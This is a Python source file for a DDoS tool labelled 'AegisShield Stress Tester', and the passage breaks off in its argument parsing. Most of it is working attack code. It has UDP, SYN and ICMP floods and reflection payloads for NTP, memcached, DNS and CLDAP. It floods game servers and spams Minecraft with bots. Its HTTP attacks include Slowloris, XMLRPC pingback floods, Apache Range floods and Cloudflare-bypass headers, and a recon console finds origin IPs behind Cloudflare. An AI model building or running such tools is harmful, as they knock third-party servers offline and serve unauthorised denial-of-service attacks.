#!/usr/bin/env python3
"""
AegisShield Stress Tester v4.0 (ULTIMATE)
==========================================
Fully self-contained stress testing tool — NO external dependencies needed.
Supports Layer 4, Layer 7, amplification, gaming protocols, and recon tools.

Usage:
  Layer 4:  python start.py <method> <ip:port> <threads> <duration>
  Layer 7:  python start.py <method> <url> <threads> <duration>
  Tools:    python start.py TOOLS
  Help:     python start.py HELP
"""

import socket
import ssl
import struct
import threading
import multiprocessing
import json
import time
import random
import os
import sys
import http.client
import urllib.parse
import urllib.request
import subprocess
import platform
from pathlib import Path
from contextlib import suppress

# ══════════════════════════════════════════════════════════════════
#  Constants & Globals
# ══════════════════════════════════════════════════════════════════
__version__ = "4.0 ULTIMATE"
__dir__ = Path(__file__).parent

REQUESTS_SENT = multiprocessing.Value('q', 0)
BYTES_SENT = multiprocessing.Value('q', 0)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]


class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

C = Colors


# ══════════════════════════════════════════════════════════════════
#  Helper Utilities
# ══════════════════════════════════════════════════════════════════

def human_bytes(n):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if abs(n) < 1024.0:
            return f"{n:.2f} {unit}"
        n /= 1024.0
    return f"{n:.2f} PB"


def human_format(num):
    for unit in ['', 'k', 'm', 'g']:
        if abs(num) < 1000.0:
            return f"{num:.1f}{unit}"
        num /= 1000.0
    return f"{num:.1f}t"


def rand_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def rand_str(length=12):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(chars) for _ in range(length))


def resolve_host(hostname):
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror as e:
        print(f"{C.RED}  ✖ Cannot resolve: {hostname} — {e}{C.RESET}")
        sys.exit(1)


# ══════════════════════════════════════════════════════════════════
#  Protocol Payloads
# ══════════════════════════════════════════════════════════════════

UDP_PAYLOADS = {
    "VSE":    b'\xff\xff\xff\xffTSource Engine Query\x00',
    "TS3":    b'\x05\xca\x7f\x16\x9c\x11\xe9\x89\x00\x00\x00\x00\x02',
    "FIVEM":  b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00',
    "FIVEM-TOKEN": b'\xff\xff\xff\xffgetstatus\x00',
    "MEM":    b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',
    "NTP":    b'\x17\x00\x03\x2a' + b'\x00' * 44,
    "MCPE":   b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78',
    "DNS":    b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x69\x73\x00\x00\xff\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00',
    "CHAR":   b'\x01',
    "CLDAP":  b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
    "ARD":    b'\x00\x14\x00\x00\x00\x00\x00\x00',
    "RDP":    b'\x03\x00\x00\x0b\x06\xe0\x00\x00\x00\x00\x00',
}


# ══════════════════════════════════════════════════════════════════
#  Minecraft Protocol Helpers
# ══════════════════════════════════════════════════════════════════

class MC:
    @staticmethod
    def varint(d):
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += struct.pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload):
        payload = b''.join(payload)
        return MC.varint(len(payload)) + payload

    @staticmethod
    def handshake(target_host, target_port, protocol=47, state=1):
        return MC.data(
            MC.varint(0x00),
            MC.varint(protocol),
            MC.data(target_host.encode()),
            struct.pack('>H', target_port),
            MC.varint(state)
        )

    @staticmethod
    def login(username, protocol=47):
        if isinstance(username, str):
            username = username.encode()
        return MC.data(MC.varint(0x00), MC.data(username))

    @staticmethod
    def chat(message):
        return MC.data(MC.varint(0x01), MC.data(message.encode()))

    @staticmethod
    def ping():
        return MC.data(b'\x00')


# ══════════════════════════════════════════════════════════════════
#  LAYER 4 ATTACK METHODS
# ══════════════════════════════════════════════════════════════════

def _l4_udp_worker(target, port, method, duration, counter, stop_event):
    """Worker thread for UDP-based attacks."""
    end_time = time.time() + duration
    BATCH = 50
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    except Exception:
        pass

    static_payload = UDP_PAYLOADS.get(method)
    c = 0

    while time.time() < end_time and not stop_event.is_set():
        try:
            if static_payload:
                payload = static_payload
            elif method == "OVH-UDP":
                http_methods = [b"GET", b"POST", b"HEAD", b"OPTIONS", b"PURGE"]
                payload = (random.choice(http_methods) + b" / HTTP/1.1\r\nHost: " +
                           rand_str(8).encode() + b"\r\n\r\n" + random.randbytes(random.randint(64, 1024)))
            else:
                payload = random.randbytes(random.randint(512, 65507))
            s.sendto(payload, (target, port))
            c += 1
            if c % BATCH == 0:
                with counter.get_lock():
                    counter.value += BATCH
        except OSError:
            pass
    with counter.get_lock():
        counter.value += c % BATCH
    s.close()


def _l4_tcp_worker(target, port, method, duration, counter, stop_event):
    """Worker thread for TCP-based attacks."""
    end_time = time.time() + duration
    BATCH = 5
    c = 0

    while time.time() < end_time and not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            if method == "SYN":
                s.setblocking(False)
                try:
                    s.connect((target, port))
                except (BlockingIOError, InterruptedError, OSError):
                    pass
                s.close()
                c += 1

            elif method == "CPS":
                s.settimeout(2)
                s.connect((target, port))
                s.close()
                c += 1

            elif method == "CONNECTION":
                s.settimeout(5)
                s.connect((target, port))
                s.sendall(b"X")
                time.sleep(random.uniform(0.3, 1.0))
                s.close()
                c += 1

            elif method == "MCBOT":
                s.settimeout(3)
                s.connect((target, port))
                username = f"Bot_{rand_str(5)}"
                s.sendall(MC.handshake(target, port, 47, 2))
                s.sendall(MC.login(username))
                time.sleep(1)
                s.sendall(MC.chat(f"/register {rand_str(6)} {rand_str(6)}"))
                for _ in range(5):
                    if stop_event.is_set():
                        break
                    s.sendall(MC.chat(rand_str(128)))
                    time.sleep(0.5)
                s.close()
                c += 1

            elif method == "MINECRAFT":
                s.settimeout(3)
                s.connect((target, port))
                s.sendall(MC.handshake(target, port, 47, 1))
                s.sendall(MC.ping())
                s.close()
                c += 1

            else:  # TCP
                s.settimeout(2)
                s.connect((target, port))
                payload = random.randbytes(random.randint(256, 4096))
                s.sendall(payload)
                s.close()
                c += 1

            if c % BATCH == 0:
                with counter.get_lock():
                    counter.value += BATCH

        except OSError:
            c += 1
            if c % BATCH == 0:
                with counter.get_lock():
                    counter.value += BATCH

    with counter.get_lock():
        counter.value += c % BATCH


def _l4_icmp_worker(target, duration, counter, stop_event):
    """Worker thread for ICMP flood. Requires admin/root."""
    end_time = time.time() + duration
    BATCH = 10
    c = 0

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except OSError:
        print(f"  {C.RED}[!] ICMP requires admin/root privileges{C.RESET}")
        return

    def checksum(data):
        s_sum = 0
        n = len(data) % 2
        for i in range(0, len(data) - n, 2):
            s_sum += data[i] + (data[i + 1] << 8)
        if n:
            s_sum += data[-1]
        while (s_sum >> 16):
            s_sum = (s_sum & 0xFFFF) + (s_sum >> 16)
        s_sum = ~s_sum & 0xFFFF
        return s_sum

    while time.time() < end_time and not stop_event.is_set():
        try:
            pkt_id = random.randint(0, 65535)
            header = struct.pack('bbHHh', 8, 0, 0, pkt_id, 1)
            data = random.randbytes(56)
            chk = checksum(header + data)
            header = struct.pack('bbHHh', 8, 0, chk, pkt_id, 1)
            packet = header + data
            s.sendto(packet, (target, 0))
            c += 1
            if c % BATCH == 0:
                with counter.get_lock():
                    counter.value += BATCH
        except OSError:
            pass
    with counter.get_lock():
        counter.value += c % BATCH
    s.close()


# ══════════════════════════════════════════════════════════════════
#  LAYER 4 ATTACK — Process spawner
# ══════════════════════════════════════════════════════════════════

def _l4_process(target, port, method, duration, counter, stop_event, thread_count=16):
    """Each process runs N threads."""
    udp_methods = {"UDP", "OVH-UDP", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN",
                   "MEM", "NTP", "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP"}
    tcp_methods = {"TCP", "SYN", "CPS", "CONNECTION", "MCBOT", "MINECRAFT"}

    threads = []
    for _ in range(thread_count):
        if method in udp_methods:
            t = threading.Thread(target=_l4_udp_worker,
                                 args=(target, port, method, duration, counter, stop_event), daemon=True)
        elif method == "ICMP":
            t = threading.Thread(target=_l4_icmp_worker,
                                 args=(target, duration, counter, stop_event), daemon=True)
        elif method in tcp_methods:
            t = threading.Thread(target=_l4_tcp_worker,
                                 args=(target, port, method, duration, counter, stop_event), daemon=True)
        else:
            return
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def run_l4_attack(target, port, method, threads, duration):
    """Main Layer 4 attack orchestrator."""
    counter = multiprocessing.Value('q', 0)
    stop = multiprocessing.Event()
    num_procs = min(os.cpu_count() or 4, threads)
    threads_per_proc = max(1, threads // num_procs)

    procs = []
    for _ in range(num_procs):
        p = multiprocessing.Process(
            target=_l4_process,
            args=(target, port, method, duration, counter, stop, threads_per_proc),
            daemon=True
        )
        p.start()
        procs.append(p)

    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            time.sleep(2)
            elapsed = max(time.time() - start_time, 0.1)
            sent = counter.value
            pps = sent / elapsed

            if method in UDP_PAYLOADS:
                avg_size = len(UDP_PAYLOADS[method])
            elif method == "OVH-UDP":
                avg_size = 600
            elif method in {"SYN", "CPS", "ICMP"}:
                avg_size = 64
            elif method in {"CONNECTION", "MCBOT", "MINECRAFT"}:
                avg_size = 128
            else:
                avg_size = 2048

            mbps = sent * avg_size * 8 / elapsed / 1_000_000
            pct = min(100, (time.time() - start_time) / duration * 100)
            print(f"  {C.CYAN}📊 {method} | {sent:,} pkts | {pps:,.0f} pps | {mbps:,.1f} Mbps | {pct:.0f}%{C.RESET}")
    except KeyboardInterrupt:
        print(f"\n  {C.YELLOW}⏹ Interrupted{C.RESET}")

    stop.set()
    for p in procs:
        p.join(timeout=3)
        if p.is_alive():
            p.terminate()

    total = counter.value
    elapsed = max(time.time() - start_time, 0.1)
    print(f"  {C.GREEN}✅ {method} done. {total:,} packets in {elapsed:.1f}s{C.RESET}")


# ══════════════════════════════════════════════════════════════════
#  LAYER 7 ATTACK METHODS
# ══════════════════════════════════════════════════════════════════

def _l7_http_worker(url_obj, method, duration, counter, stop_event, use_ssl=False):
    """Worker thread for Layer 7 HTTP/HTTPS attacks."""
    end_time = time.time() + duration
    host = url_obj.hostname
    port = url_obj.port or (443 if use_ssl else 80)
    path = url_obj.path or "/"

    while time.time() < end_time and not stop_event.is_set():
        try:
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(host, port, timeout=5, context=ctx)
            else:
                conn = http.client.HTTPConnection(host, port, timeout=5)

            ua = random.choice(USER_AGENTS)
            headers = {
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0",
                "X-Forwarded-For": rand_ip(),
                "X-Real-IP": rand_ip(),
            }

            if method == "POST":
                body = '{"data": "%s"}' % rand_str(random.randint(32, 256))
                headers["Content-Type"] = "application/json"
                conn.request("POST", path, body=body, headers=headers)
            elif method == "HEAD":
                conn.request("HEAD", path, headers=headers)
            elif method == "PPS":
                headers.pop("Accept", None)
                headers.pop("Accept-Language", None)
                headers.pop("Accept-Encoding", None)
                conn.request("GET", path, headers=headers)
            elif method == "STRESS":
                body = '{"data": "%s"}' % rand_str(512)
                headers["Content-Type"] = "application/json"
                headers["X-Requested-With"] = "XMLHttpRequest"
                conn.request("POST", path, body=body, headers=headers)
            elif method == "SLOW":
                # Slowloris via HTTP
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                if use_ssl:
                    ctx2 = ssl.create_default_context()
                    ctx2.check_hostname = False
                    ctx2.verify_mode = ssl.CERT_NONE
                    s = ctx2.wrap_socket(s, server_hostname=host)
                s.connect((host, port))
                s.send(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n".encode())
                while time.time() < end_time and not stop_event.is_set():
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    with counter.get_lock():
                        counter.value += 1
                    time.sleep(random.uniform(5, 15))
                s.close()
                continue
            elif method == "XMLRPC":
                body = ("<?xml version='1.0'?><methodCall><methodName>pingback.ping</methodName>"
                        "<params><param><value><string>%s</string></value></param>"
                        "<param><value><string>%s</string></value></param></params></methodCall>" %
                        (rand_str(64), rand_str(64)))
                headers["Content-Type"] = "application/xml"
                conn.request("POST", "/xmlrpc.php", body=body, headers=headers)
            elif method == "BYPASS":
                conn.request("GET", path, headers=headers)
            elif method == "CFB":
                headers["Sec-Fetch-Dest"] = "document"
                headers["Sec-Fetch-Mode"] = "navigate"
                headers["Sec-Fetch-Site"] = "none"
                headers["Sec-Fetch-User"] = "?1"
                headers["Upgrade-Insecure-Requests"] = "1"
                conn.request("GET", path, headers=headers)
            elif method == "DYN":
                headers["Host"] = f"{rand_str(6)}.{host}"
                conn.request("GET", path, headers=headers)
            elif method == "NULL":
                headers["User-Agent"] = "null"
                conn.request("GET", path, headers=headers)
            elif method == "APACHE":
                range_header = ",".join(f"5-{i}" for i in range(1, 1024))
                headers["Range"] = f"bytes=0-,{range_header}"
                conn.request("GET", path, headers=headers)
            elif method == "BOT":
                headers["User-Agent"] = random.choice(USER_AGENTS[-2:])
                conn.request("GET", "/robots.txt", headers=headers)
                conn.request("GET", "/sitemap.xml", headers=headers)
            elif method == "GSB":
                conn.request("HEAD", f"{path}?qs={rand_str(6)}", headers=headers)
            elif method == "RHEX":
                conn.request("GET", f"{path}/{rand_str(random.choice([32, 64, 128]))}", headers=headers)
            elif method == "COOKIE":
                headers["Cookie"] = f"_ga=GA{random.randint(1000, 99999)}; _gat=1; {rand_str(6)}={rand_str(32)}"
                conn.request("GET", path, headers=headers)
            elif method == "EVEN":
                conn.request("GET", path, headers=headers)
                try:
                    conn.getresponse()
                except Exception:
                    pass
            elif method == "OVH":
                for _ in range(min(5, 3)):
                    conn.request("GET", path, headers=headers)
            elif method == "STOMP":
                hex_path = rand_str(128)
                headers["Host"] = f"{host}/{hex_path}"
                conn.request("GET", f"/{hex_path}", headers=headers)
            elif method == "KILLER":
                for _ in range(10):
                    conn.request("GET", path, headers=headers)
            elif method == "DOWNLOADER":
                conn.request("GET", path, headers=headers)
                try:
                    resp = conn.getresponse()
                    resp.read()
                except Exception:
                    pass
            elif method == "BOMB":
                for _ in range(10):
                    conn.request("GET", path, headers=headers)
            elif method == "AVB":
                conn.request("GET", path, headers=headers)
                time.sleep(max(1, random.random()))
            elif method == "DGB":
                conn.request("GET", path, headers=headers)
            elif method == "CFBUAM":
                conn.request("GET", path, headers=headers)
                time.sleep(5)
                for _ in range(3):
                    conn.request("GET", path, headers=headers)
            else:
                conn.request("GET", path, headers=headers)

            try:
                conn.getresponse()
            except Exception:
                pass
            conn.close()

            with counter.get_lock():
                counter.value += 1
        except Exception:
            with counter.get_lock():
                counter.value += 1


def run_l7_attack(url_str, method, threads, duration):
    """Main Layer 7 attack orchestrator."""
    if not url_str.startswith("http"):
        url_str = "http://" + url_str
    url_obj = urllib.parse.urlparse(url_str)
    use_ssl = url_obj.scheme == "https"

    counter = multiprocessing.Value('q', 0)
    stop = threading.Event()

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=_l7_http_worker,
                             args=(url_obj, method, duration, counter, stop, use_ssl), daemon=True)
        t.start()
        thread_list.append(t)

    start_time = time.time()
    try:
        while time.time() - start_time < duration:
            time.sleep(2)
            elapsed = max(time.time() - start_time, 0.1)
            sent = counter.value
            rps = sent / elapsed
            pct = min(100, (time.time() - start_time) / duration * 100)
            print(f"  {C.CYAN}📊 {method} | {sent:,} reqs | {rps:,.0f} req/s | {pct:.0f}%{C.RESET}")
    except KeyboardInterrupt:
        print(f"\n  {C.YELLOW}⏹ Interrupted{C.RESET}")

    stop.set()
    for t in thread_list:
        t.join(timeout=2)

    total = counter.value
    elapsed = max(time.time() - start_time, 0.1)
    print(f"  {C.GREEN}✅ {method} done. {total:,} requests in {elapsed:.1f}s{C.RESET}")


# ══════════════════════════════════════════════════════════════════
#  TOOLS CONSOLE
# ══════════════════════════════════════════════════════════════════

class ToolsConsole:
    """Interactive recon tools console."""

    @staticmethod
    def run():
        hostname = socket.gethostname()
        prompt = f"{C.MAGENTA}{hostname}@AegisTools:~# {C.RESET}"

        while True:
            try:
                cmd = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

            if not cmd:
                continue

            parts = cmd.split(" ", 1)
            command = parts[0].upper()
            args = parts[1] if len(parts) > 1 else ""

            if command in ("EXIT", "QUIT", "Q", "E"):
                break
            elif command in ("HELP", "H"):
                ToolsConsole.print_help()
            elif command == "CLEAR":
                os.system("cls" if os.name == "nt" else "clear")
            elif command == "CFIP":
                ToolsConsole.cfip(args)
            elif command == "DNS":
                ToolsConsole.dns_lookup(args)
            elif command == "TSSRV":
                ToolsConsole.tssrv(args)
            elif command == "PING":
                ToolsConsole.ping(args)
            elif command == "CHECK":
                ToolsConsole.check(args)
            elif command == "DSTAT":
                ToolsConsole.dstat()
            else:
                print(f"  {C.RED}Unknown command: {command}. Type HELP for commands.{C.RESET}")

    @staticmethod
    def print_help():
        print(f"""
  {C.BOLD}Available Tools:{C.RESET}
  {C.CYAN}CFIP{C.RESET}  <domain>   — Find Real IP behind Cloudflare
  {C.CYAN}DNS{C.RESET}   <domain>   — Show DNS records
  {C.CYAN}TSSRV{C.RESET} <domain>   — TeamSpeak SRV resolver
  {C.CYAN}PING{C.RESET}  <host>     — Ping a server
  {C.CYAN}CHECK{C.RESET} <url>      — Check website status
  {C.CYAN}DSTAT{C.RESET}            — Live network I/O stats
  {C.CYAN}CLEAR{C.RESET}            — Clear screen
  {C.CYAN}EXIT{C.RESET}             — Exit tools
""")

    @staticmethod
    def cfip(domain):
        if not domain:
            domain = input(f"  {C.YELLOW}Domain: {C.RESET}").strip()
        if not domain:
            return
        domain = domain.replace("https://", "").replace("http://", "").split("/")[0]
        print(f"  {C.YELLOW}Scanning subdomains for {domain}...{C.RESET}")

        subdomains = ["mail", "direct", "ftp", "cpanel", "webmail", "www", "admin",
                       "staging", "dev", "api", "m", "ns1", "ns2", "old", "test"]
        found = set()
        for sub in subdomains:
            full = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(full)
                if ip not in found:
                    found.add(ip)
                    print(f"  {C.GREEN}✓ {full} → {ip}{C.RESET}")
            except socket.gaierror:
                pass

        # Historical DNS via API
        with suppress(Exception):
            url = f"https://dns.google/resolve?name={domain}&type=A"
            req = urllib.request.Request(url, headers={"User-Agent": "AegisTools/1.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode())
                for ans in data.get("Answer", []):
                    ip = ans.get("data", "")
                    if ip and ip not in found:
                        found.add(ip)
                        print(f"  {C.GREEN}✓ DNS API → {ip}{C.RESET}")

        if not found:
            print(f"  {C.RED}No IPs found{C.RESET}")
        else:
            print(f"  {C.BLUE}Found {len(found)} unique IP(s){C.RESET}")

    @staticmethod
    def dns_lookup(domain):
        if not domain:
            domain = input(f"  {C.YELLOW}Domain: {C.RESET}").strip()
        if not domain:
            return
        domain = domain.replace("https://", "").replace("http://", "").split("/")[0]

        record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]
        for rtype in record_types:
            with suppress(Exception):
                url = f"https://dns.google/resolve?name={domain}&type={rtype}"
                req = urllib.request.Request(url, headers={"User-Agent": "AegisTools/1.0"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    data = json.loads(resp.read().decode())
                    answers = data.get("Answer", [])
                    if answers:
                        for ans in answers:
                            print(f"  {C.GREEN}{rtype:>6} → {ans.get('data', 'N/A')}{C.RESET}")

    @staticmethod
    def tssrv(domain):
        if not domain:
            domain = input(f"  {C.YELLOW}Domain: {C.RESET}").strip()
        if not domain:
            return
        domain = domain.replace("https://", "").replace("http://", "").split("/")[0]

        for record in ["_ts3._udp", "_tsdns._tcp"]:
            with suppress(Exception):
                url = f"https://dns.google/resolve?name={record}.{domain}&type=SRV"
                req = urllib.request.Request(url, headers={"User-Agent": "AegisTools/1.0"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    data = json.loads(resp.read().decode())
                    answers = data.get("Answer", [])
                    if answers:
                        for ans in answers:
                            print(f"  {C.GREEN}{record} → {ans.get('data', 'Not Found')}{C.RESET}")
                    else:
                        print(f"  {C.RED}{record} → Not Found{C.RESET}")

    @staticmethod
    def ping(host):
        if not host:
            host = input(f"  {C.YELLOW}Host: {C.RESET}").strip()
        if not host:
            return
        host = host.replace("https://", "").replace("http://", "").split("/")[0]

        param = '-n' if os.name == 'nt' else '-c'
        cmd = ['ping', param, '4', host]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            print(result.stdout)
            if result.returncode == 0:
                print(f"  {C.GREEN}✓ Host is ONLINE{C.RESET}")
            else:
                print(f"  {C.RED}✖ Host appears OFFLINE{C.RESET}")
        except subprocess.TimeoutExpired:
            print(f"  {C.RED}✖ Ping timed out{C.RESET}")

    @staticmethod
    def check(url):
        if not url:
            url = input(f"  {C.YELLOW}URL: {C.RESET}").strip()
        if not url:
            return
        if not url.startswith("http"):
            url = "http://" + url

        try:
            req = urllib.request.Request(url, headers={"User-Agent": random.choice(USER_AGENTS)})
            with urllib.request.urlopen(req, timeout=10) as resp:
                code = resp.getcode()
                status = "ONLINE" if code < 500 else "OFFLINE"
                color = C.GREEN if code < 500 else C.RED
                print(f"  {color}Status: {code} ({status}){C.RESET}")
        except urllib.error.HTTPError as e:
            print(f"  {C.YELLOW}HTTP Error: {e.code}{C.RESET}")
        except Exception as e:
            print(f"  {C.RED}Error: {e}{C.RESET}")

    @staticmethod
    def dstat():
        print(f"  {C.CYAN}Live Network Stats (Ctrl+C to stop){C.RESET}")
        try:
            import psutil
            prev = psutil.net_io_counters()
            while True:
                time.sleep(1)
                curr = psutil.net_io_counters()
                sent = curr.bytes_sent - prev.bytes_sent
                recv = curr.bytes_recv - prev.bytes_recv
                p_sent = curr.packets_sent - prev.packets_sent
                p_recv = curr.packets_recv - prev.packets_recv
                print(f"  {C.BLUE}▲ {human_bytes(sent)}/s  ▼ {human_bytes(recv)}/s  "
                      f"| Pkts ▲{p_sent:,} ▼{p_recv:,} "
                      f"| CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}%{C.RESET}")
                prev = curr
        except ImportError:
            print(f"  {C.YELLOW}psutil not installed. Using basic mode.{C.RESET}")
            if os.name == 'nt':
                while True:
                    subprocess.run(["netstat", "-e"], timeout=5)
                    time.sleep(2)
            else:
                while True:
                    subprocess.run(["cat", "/proc/net/dev"], timeout=5)
                    time.sleep(2)
        except KeyboardInterrupt:
            print(f"\n  {C.YELLOW}DSTAT stopped{C.RESET}")


# ══════════════════════════════════════════════════════════════════
#  METHOD DEFINITIONS
# ══════════════════════════════════════════════════════════════════

LAYER4_METHODS = {
    "UDP", "TCP", "SYN", "ICMP", "CPS", "CONNECTION",
    "OVH-UDP", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN",
    "MEM", "NTP", "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP",
    "MCBOT", "MINECRAFT",
}

LAYER7_METHODS = {
    "GET", "POST", "HEAD", "CFB", "CFBUAM", "BYPASS", "OVH", "STRESS",
    "DYN", "SLOW", "GSB", "DGB", "AVB", "APACHE", "XMLRPC", "BOT",
    "BOMB", "DOWNLOADER", "KILLER", "PPS", "EVEN", "RHEX", "STOMP",
    "NULL", "COOKIE",
}

ALL_METHODS = LAYER4_METHODS | LAYER7_METHODS


# ══════════════════════════════════════════════════════════════════
#  BANNER & USAGE
# ══════════════════════════════════════════════════════════════════

BANNER = f"""
{C.RED}
    ╔═══════════════════════════════════════════════════════════╗
    ║   █████  ███████  ██████  ██ ███████ ███████ ██   ██     ║
    ║  ██   ██ ██      ██       ██ ██      ██      ██   ██     ║
    ║  ███████ █████   ██   ███ ██ ███████ ███████ ███████     ║
    ║  ██   ██ ██      ██    ██ ██      ██      ██ ██   ██     ║
    ║  ██   ██ ███████  ██████  ██ ███████ ███████ ██   ██     ║
    ╚═══════════════════════════════════════════════════════════╝{C.RESET}
    {C.CYAN}AegisShield Stress Tester v{__version__}{C.RESET}
    {C.YELLOW}✦ {len(ALL_METHODS)} Attack Methods | Layer 4 + Layer 7 + Tools{C.RESET}
"""


def print_usage():
    print(BANNER)
    print(f"""
  {C.BOLD}Usage:{C.RESET}
    {C.GREEN}L4:{C.RESET}    python start.py <method> <ip:port> <threads> <duration>
    {C.GREEN}L7:{C.RESET}    python start.py <method> <url> <threads> <duration>
    {C.GREEN}Tools:{C.RESET} python start.py TOOLS
    {C.GREEN}Help:{C.RESET}  python start.py HELP

  {C.BOLD}Layer 4 Methods ({len(LAYER4_METHODS)}):{C.RESET}
    {C.CYAN}Volumetric:{C.RESET}       UDP, TCP, SYN, ICMP, OVH-UDP
    {C.CYAN}Connection:{C.RESET}       CPS, CONNECTION
    {C.CYAN}Gaming:{C.RESET}           VSE, TS3, FIVEM, FIVEM-TOKEN, MCBOT, MINECRAFT, MCPE
    {C.CYAN}Amplification:{C.RESET}    MEM, NTP, DNS, CHAR, CLDAP, ARD, RDP

  {C.BOLD}Layer 7 Methods ({len(LAYER7_METHODS)}):{C.RESET}
    {C.CYAN}Basic:{C.RESET}            GET, POST, HEAD, PPS, EVEN, NULL, COOKIE
    {C.CYAN}Advanced:{C.RESET}         CFB, CFBUAM, BYPASS, OVH, DYN, GSB, RHEX, STOMP, DGB, AVB
    {C.CYAN}Resource:{C.RESET}         STRESS, SLOW, APACHE, XMLRPC, BOT, BOMB, DOWNLOADER, KILLER

  {C.BOLD}Tools:{C.RESET}
    {C.CYAN}CFIP{C.RESET}   — Find real IP behind Cloudflare
    {C.CYAN}DNS{C.RESET}    — Show DNS records
    {C.CYAN}TSSRV{C.RESET}  — TeamSpeak SRV resolver
    {C.CYAN}PING{C.RESET}   — Ping servers
    {C.CYAN}CHECK{C.RESET}  — Check website status
    {C.CYAN}DSTAT{C.RESET}  — Live network I/O stats

  {C.BOLD}Examples:{C.RESET}
    python start.py UDP 1.2.3.4:80 100 60
    python start.py VSE 1.2.3.4:27015 50 120
    python start.py GET https://target.com 200 60
    python start.py SLOW https://target.com 100 120
    python start.py TOOLS
""")


# ══════════════════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ══════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    # Freeze support for Windows multiprocessing
    multiprocessing.freeze_support()

    print(BANNER)

    if len(sys.argv) < 2 or sys.argv[1].upper() in ("HELP", "--HELP", "-H"):
        print_usage()
        sys.exit(0)

    cmd = sys.argv[1].upper()

    if cmd == "TOOLS":
        ToolsConsole.run()
        sys.exit(0)

    if cmd == "STOP":
        print(f"  {C.YELLOW}Stopping all Python processes...{C.RESET}")
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] in ('python.exe', 'python3.exe', 'python'):
                    if proc.pid != os.getpid():
                        proc.kill()
        except ImportError:
            if os.name == 'nt':
                os.system("taskkill /F /IM python.exe 2>nul")
            else:
                os.system("pkill -9 python 2>/dev/null")
        sys.exit(0)

    # Parse attack arguments
    if len(sys.argv) < 5:
        print(f"  {C.RED}Usage: python start.py <method> <target> <threads> <duration>{C.RESET}")
        print_usage()
        sys.exit(1)

    method = cmd
    target_raw = sys.argv[2].strip()
